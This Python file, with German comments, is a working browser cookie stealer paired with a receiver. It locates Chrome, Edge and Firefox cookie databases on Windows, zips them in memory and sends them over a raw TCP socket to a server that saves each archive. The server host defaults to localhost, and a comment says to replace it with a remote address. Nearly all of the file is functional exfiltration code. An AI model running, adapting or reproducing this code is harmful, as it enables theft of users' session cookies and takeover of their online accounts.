import io
import os
import socket
import threading
import zipfile
from pathlib import Path


def find_cookies_files():
    """
    Find the paths to the cookies files for Chrome, Edge, and Firefox.

    :return: A dictionary containing the paths to the cookies files for each browser.
    :rtype: dict
    """
    cookies_files = dict()

    # Get the user's home directory
    home = Path.home()
    print(f"Home directory: {home}")

    # Chrome
    chrome_cookies_path = home / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
    if chrome_cookies_path.exists():
        print(f"Chrome cookies file found: {chrome_cookies_path}")
        cookies_files["chrome"] = chrome_cookies_path

    # Edge
    edge_cookies_path = home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default" / "Cookies"
    if edge_cookies_path.exists():
        print(f"Edge cookies file found: {edge_cookies_path}")
        cookies_files["edge"] = edge_cookies_path

    # Firefox
    firefox_profiles_path = home / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
    if firefox_profiles_path.exists():
        cookies_file_list = []
        print(f"Firefox profiles folder found: {firefox_profiles_path}")
        for profile_folder in firefox_profiles_path.iterdir():
            firefox_cookies_path = profile_folder / "cookies.sqlite"
            if firefox_cookies_path.exists():
                print(f"Firefox cookies file found: {firefox_cookies_path}")
                cookies_file_list.append(firefox_cookies_path)
        cookies_files["firefox"] = cookies_file_list

    return cookies_files


def handle_client(client_socket, file_folder):
    """
    :param client_socket: The socket object representing the client connection.
    :param file_folder: The path of the folder where the received file will be saved.
    :return: None

    This method handles the communication with a client, receiving a file over the network and saving it to the specified folder.
    It expects the client to send the file type as "ZIPFILE" and the size of the ZIP file in bytes.

    If the received file type is not "ZIPFILE", an error message is printed and the method returns without saving the file.

    The received ZIP file is saved to the specified folder by reading blocks of data from the client socket and writing them to the file.
    The size of each block is 1024 bytes or the remaining size of the file, whichever is smaller, to optimize memory usage.

    After the file is received and saved, the client socket is closed and a message is printed indicating successful completion.
    """
    try:
        with client_socket:
            # Empfangen des Dateityps (7 Bytes für "ZIPFILE")
            file_type_data = client_socket.recv(7).decode('utf-8')

            if file_type_data != "ZIPFILE":
                print("Unexpected file type received")
                return

            # Empfangen der Größe der ZIP-Datei
            zip_size_data = client_socket.recv(8)
            zip_size = int.from_bytes(zip_size_data, byteorder="big")

            # Empfangen der ZIP-Datei

            with open(file_folder, "wb") as file:
                remaining_size = zip_size
                while remaining_size > 0:
                    data = client_socket.recv(min(1024, remaining_size))
                    if not data:
                        break
                    file.write(data)
                    remaining_size -= len(data)
    finally:
        client_socket.close()
        print("Client connection closed. All data received.")


def find_next_file(folder):
    """
    Find the next file in the given folder.

    :param folder: The folder in which to search for the next file.
    :type folder: str

    :return: The path of the next file.
    :rtype: str

    Usage:
        >>> find_next_file('/path/to/folder')
        '/path/to/folder/received_data1.zip'
    """
    i = 1
    while True:
        file = folder / f"received_data{i}.zip"
        if not file.exists():
            # create the file
            file.touch()
            return file
        i += 1


# Server-Teil
def start_server():
    """
    Starts the server and listens for incoming connections.

    :return: None
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 12345))
    server_socket.listen()

    print("Server is waiting for connections...")
    try:
        while True:
            client_socket, _ = server_socket.accept()

            print(f"New connection received.")
            folder = Path.home() / "cookie_folder"
            if not os.path.exists(folder):
                os.makedirs(folder, exist_ok=True)
            file = find_next_file(folder)
            client_thread = threading.Thread(target=handle_client, args=(client_socket, file))
            client_thread.start()
    except KeyboardInterrupt:
        print("Shutting down the server...")
    finally:
        server_socket.close()


# Include the previous find_cookies_files function

def zip_cookies_folder(data_dict):
    """

    **zip_cookies_folder(data_dict)**

    This method takes a dictionary as input, where the keys represent folder names and the values represent the paths or lists of paths to be included in the zip file.

    The method creates a BytesIO object to store the zipped contents of the specified folder(s). It then iterates over the keys and values of the given dictionary, checking the type of each
    * value and adding the corresponding files or directories to the zip file.

    If a value is a single path, it checks whether it represents a file or a directory. If it is a directory, it adds all files from that directory to the zip file. If it is a file, it adds
    * that file to the zip file.

    If a value is a list of paths, it checks each path in the list and adds the corresponding files or directories to the zip file.

    If a value is neither a single path nor a list of paths, it prints an error message indicating that an invalid value has been provided.

    Finally, the zipped contents are stored in the BytesIO object, which is then returned as the result of the method.

    Example usage:

    ```python
    data_dict = {
        "folder1": "/path/to/folder1",
        "folder2": ["/path/to/folder2", "/path/to/folder3"]
    }

    zip_buffer = zip_cookies_folder(data_dict)
    ```

    In the example above, the method `zip_cookies_folder` is called with a dictionary containing two folder names and their corresponding paths or lists of paths. The method returns a Bytes
    *IO object containing the zipped contents of the specified folders."""
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for folder_name, path_or_paths in data_dict.items():
            print("folder_name: " + folder_name)
            if isinstance(path_or_paths, Path):
                if path_or_paths.is_dir():
                    # Add all files from the directory
                    for file_path in path_or_paths.iterdir():
                        if file_path.is_file():
                            arcname = os.path.join(folder_name, file_path.name)
                            zip_file.write(file_path, arcname)
                elif path_or_paths.is_file():
                    # Add single file
                    arcname = os.path.join(folder_name, path_or_paths.name)
                    zip_file.write(path_or_paths, arcname)
            elif isinstance(path_or_paths, list):
                print("decompressing list")
                # Process list of paths
                for path in path_or_paths:
                    if path.is_dir():
                        print("found directory: " + str(path))
                        # Add all files from the directory
                        for file_path in path.iterdir():
                            if file_path.is_file():
                                arcname = os.path.join(folder_name, file_path.name)
                                zip_file.write(file_path, arcname)
                    elif path.is_file():
                        print("found file: " + str(path))
                        # Add single file
                        arcname = os.path.join(folder_name, path.name)
                        zip_file.write(path, arcname)
            else:
                print(f"Invalid path or paths for folder {folder_name}: {type(path_or_paths)}")

    zip_buffer.seek(0)
    return zip_buffer


def send_cookies_folder_to_server(server_host, server_port, cookies_folder_path):
    """
    Sends a cookies folder to a server using a TCP socket connection.

    :param server_host: The hostname or IP address of the server.
    :param server_port: The port number on which the server is listening.
    :param cookies_folder_path: The path to the cookies folder that needs to be sent.

    :return: None
    """
    zip_buffer = zip_cookies_folder(cookies_folder_path)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))

        # Senden der Nachricht, dass die folgenden Daten eine ZIP-Datei sind
        file_type_message = "ZIPFILE"  # 7 Zeichen lang
        client_socket.sendall(file_type_message.encode('utf-8'))

        # Senden der Größe der ZIP-Datei
        zip_size = zip_buffer.getbuffer().nbytes
        client_socket.sendall(zip_size.to_bytes(8, byteorder="big"))

        # Senden der ZIP-Datei
        client_socket.sendall(zip_buffer.getvalue())
        print("Cookies folder sent to the server.")


def client_main_folder_finder():
    """
    client_main_folder_finder()

    This method finds the cookies files, chooses the folder of the first cookies file found (only firefox), and sends it to the server.

    :return: None
    """
    cookies_files_list = find_cookies_files()
    # Choose the folder of the first cookies file found only firefox possible
    if(len(cookies_files_list) > 0):
        server_host = "localhost"  # Replace with the server's IP address
        server_port = 12345  # Replace with the server's port number
    
        print(cookies_files_list)
        send_cookies_folder_to_server(server_host, server_port, cookies_files_list)

    else:
        print("No cookies folder found.")

if __name__ == "__main__":
    mode = input("Start as (server/client): ").lower().strip()
    if mode == "server":
        start_server()
    elif mode == "client":
        client_main_folder_finder()
    else:
        print("Invalid mode selected. Please choose 'server' or 'client'.")
